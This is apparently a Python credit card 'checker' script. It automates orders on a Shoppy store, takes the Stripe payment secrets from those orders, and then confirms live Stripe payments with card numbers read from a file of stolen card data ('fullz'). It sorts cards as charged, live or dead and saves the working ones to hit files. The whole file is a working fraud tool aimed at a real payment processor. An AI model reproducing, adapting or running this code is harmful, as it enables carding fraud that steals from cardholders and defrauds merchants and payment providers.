import requests
import concurrent.futures
import time
import re
from bs4 import BeautifulSoup
# from func import *

session = requests.Session()

sh_id = "rjpMn4G"

def multiexplode(string):
    lista = str(string)
    if lista.__contains__('|'):
        final = lista.split('|')
        return final
    elif lista.__contains__(':'):
        final = lista.split(':')
        return final

def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None
    


def key():
        url1 = "https://shoppy.gg/api/v1/public/order/store"
        headers1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
        }
        payload1 = {
            "product": f"{sh_id}",
            "gateway": "Stripe",
            "email": "jjcymvze@karenkey.com",
            "fields": [],
            "quantity": 1,
        }

        response1 = session.put(url1, json=payload1, headers=headers1)

        shoggy = response1.json()["order"]["id"]

        #-----------Done -------------#

        response2 = session.get(f"https://payment.shoppy.gg/api/1.0/order/gateway/Stripe/id/{shoggy}")

        client_secret1 = find_between(response2.text, '"secret":"', '"')
        pi1 = find_between(response2.text, '"secret":"', '_secret')
        stripe_account1 = find_between(response2.text, '"address":"', '"')
        amount1 = response2.json()["order"]["required"]

        pop = (f"client_secret={client_secret1}&&pi={pi1}&&stripe_account={stripe_account1}&&amount={amount1}&&")
        return pop

pop = key()

print(pop)

total = []
hits = []
live = []

def charge(fullz,pop):
    try:
        total.append("1")
        lista = fullz
        cc = multiexplode(lista)[0]
        mes = multiexplode(lista)[1]
        ano = multiexplode(lista)[2]
        # cvv = multiexplode(lista)[3]

#_---------------- 
        start = time.time()
        time.sleep(3)
        
        key = "pk_live_Pn4KcUGg8yzq6ien9HRLQzfA"
        try:
            client_secret = find_between(pop, 'client_secret=','&&pi=')
            pi = find_between(pop, '&&pi=', '&&stripe_account')
            amount = find_between(pop, '&&amount=', '&&')
            stripe_account = find_between(pop, '&&stripe_account=', '&&amount')

        except:
            pop = key()

        # print(client_secret)


    #----------------------------Checking The result-------------#

        data3 = {
            'source_data[type]': 'card',
            'source_data[owner][name]': 'Mike Smith',
            'source_data[owner][address][postal_code]': 10080,
            'source_data[card][number]': cc,
            'source_data[card][cvc]': '',
            'source_data[card][exp_month]': mes,
            'source_data[card][exp_year]': ano,
            'source_data[guid]': '6bd46cfe-7879-48ce-9458-df43a3102ef860fb28',
            'source_data[muid]': 'fed24e84-95b9-4098-9220-888de02e2a834721d3',
            'source_data[sid]': '2257062d-b921-4ea0-b444-3c230f905937fc36c5',
            'source_data[pasted_fields]': 'number',
            'source_data[payment_user_agent]': 'stripe.js/6bb63d231e; stripe-js-v3/6bb63d231e; card-element',
            'source_data[time_on_page]': 228578,
            'expected_payment_method_type': 'card',
            'use_stripe_sdk': True,
            'key': key,
            '_stripe_account': stripe_account,
            'client_secret': client_secret
        }

        response3 = session.post(f"https://api.stripe.com/v1/payment_intents/{pi}/confirm", data=data3)

        # print(response3.text)

        message = find_between(response3.text, '"message": "', '"')

        ninja = response3.text

        while True:
            if "You cannot confirm this PaymentIntent because it has already succeeded after being previously confirmed" in response3.text:
                pop = key()
                print(f"client_secret={client_secret}&&pi={pi}&&stripe_account={stripe_account}&&amount={amount}&&")
                continue
            else:
                if 'succeeded' in ninja:
                    response = f"Charged {amount} Idk ✅"
                    hits.append("1")
                    with open("charged.txt", "a",encoding="UTF-8") as f:
                        f.write(f"{fullz}-{response}\n")


                elif "insufficient_funds" in ninja or "card has insufficient funds." in ninja:
                    status = "Live 🟢"
                    response = "Insufficient Funds ❎"
                    live.append("1")
                    with open("hits.txt", "a",encoding="UTF-8") as f:
                        f.write(f"{fullz}-{response}\n")
                
                elif "incorrect_cvc" in ninja or "security code is incorrect." in ninja or "Your card's security code is incorrect." in ninja or "Your card's security code is invalid." in ninja or "invalid_cvc" in ninja:
                    status = "Live 🟢"
                    response = "CCN Live ❎"
                    live.append("1")
                    with open("hits.txt", "a",encoding="UTF-8") as f:
                        f.write(f"{fullz}-{response}\n")
                
                elif "transaction_not_allowed" in ninja:
                    status = "Live 🟢"
                    response = "Card Doesn't Support Purchase ❎"
                    live.append("1")
                    with open("hits.txt", "a",encoding="UTF-8") as f:
                        f.write(f"{fullz}-{response}\n")
                
                elif '"cvc_check": "pass"' in ninja:
                    status = "Live 🟢"
                    response = "CVV LIVE ❎"
                    live.append("1")
                    with open("hits.txt", "a",encoding="UTF-8") as f:
                        f.write(f"{fullz}-{response}\n")
                
                
                elif "Your card does not support this type of purchase." in ninja:
                    status = "Live 🟢"
                    response = "Card Doesn't Support Purchase ❎"
                    live.append("1")
                    with open("hits.txt", "a",encoding="UTF-8") as f:
                        f.write(f"{fullz}-{response}\n")

                elif "stripe_3ds2_fingerprint" in ninja:
                    status = "3D Secured ❎"
                    response = "3D Secured ❎"
                    with open ("logs.txt","a",encoding="UTF-8") as f:
                        f.write(fullz+" - "+response+"\n")

                elif "three_d_secure_redirect" in ninja or "card_error_authentication_required" in ninja:
                    status = "3D Secure Redirected ❎"
                    response = "3D Secure Redirected ❎"
                    with open ("logs.txt","a",encoding="UTF-8") as f:
                        f.write(fullz+" - "+response+"\n")
                
                
                elif "generic_decline" in ninja or "You have exceeded the maximum number of declines on this card in the last 24 hour period." in ninja or "card_decline_rate_limit_exceeded" in ninja:
                    status = "Dead 🔴"
                    response = "Generic Decline 🚫"
                
                elif "do_not_honor" in ninja:
                    status = "Dead 🔴"
                    response = "Do Not Honor 🚫"

                elif '"root_certificate_authorities":' in ninja:
                    status = "Dead 🔴"
                    response = "3ds OTP 🚫"
                
                elif "fraudulent" in ninja:
                    status = "Dead 🔴"
                    response = "Fraudulent 🚫"
                
                elif "stolen_card" in ninja:
                    status = "Dead 🔴"
                    response = "Stolen Card 🚫"
                
                elif "lost_card" in ninja:
                    status = "Dead 🔴"
                    response = "Lost Card 🚫"
                
                elif "pickup_card" in ninja:
                    status = "Dead 🔴"
                    response = "Pickup Card 🚫"
                
                elif "incorrect_number" in ninja:
                    status = "Dead 🔴"
                    response = "Incorrect Card Number 🚫"
                
                elif "Your card has expired." in ninja or "expired_card" in ninja:
                    status = "Dead 🔴"
                    response = "Expired Card 🚫"
                
                elif "intent_confirmation_challenge" in ninja:
                    status = "Dead 🔴"
                    response = "Captcha 😥"
                
                elif "Your card number is incorrect." in ninja:
                    status = "Dead 🔴"
                    response = "Incorrect Card Number 🚫"
                
                elif "Your card's expiration year is invalid." in ninja or "Your card\'s expiration year is invalid." in ninja:
                    status = "Dead 🔴"
                    response = "Expiration Year Invalid 🚫"
                
                elif "Your card's expiration month is invalid." in ninja or "invalid_expiry_month" in ninja:
                    status = "Dead 🔴"
                    response = "Expiration Month Invalid 🚫"
                
                elif "card is not supported." in ninja:
                    status = "Dead 🔴"
                    response = "Card Not Supported 🚫"
                
                elif "invalid_account" in ninja:
                    status = "Dead 🔴"
                    response = "invalid_account 🚫"
                
                elif "Invalid API Key provided" in ninja or "testmode_charges_only" in ninja or "api_key_expired" in ninja:
                    status = "SK_DEAD"
                    response = "SK DEAD 🚫"
                
                elif "Your card was declined." in ninja or "card was declined" in ninja:
                    status = "Dead 🔴"
                    response = "Generic Decline 🚫"
                
                else:
                    status = "Dead 🔴"
                    response = message
                    with open ("logs.txt","a",encoding="UTF-8") as f:
                        f.write(fullz+" - "+message+"\n")
                end = time.time()
                taken = end - start
                # resp = f"{fullz} - {response} - TIME TAKEN {taken:.2f}s"
                resp = f"{fullz} - {response} - TIME TAKEN {taken:.2f}s"
                return resp

    #-------------------End Response-------------------------------#

    except Exception as e:
        print(e)

print("STARTING CC CHECKING...")

ccs = open("cc.txt").read().splitlines()
threads = []
with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
    for cc in ccs:
        threads.append(executor.submit(charge, cc,pop))
    for future in concurrent.futures.as_completed(threads):
        result = future.result()
        print(result)

print("DONE FINISHED CHECKING...")


    




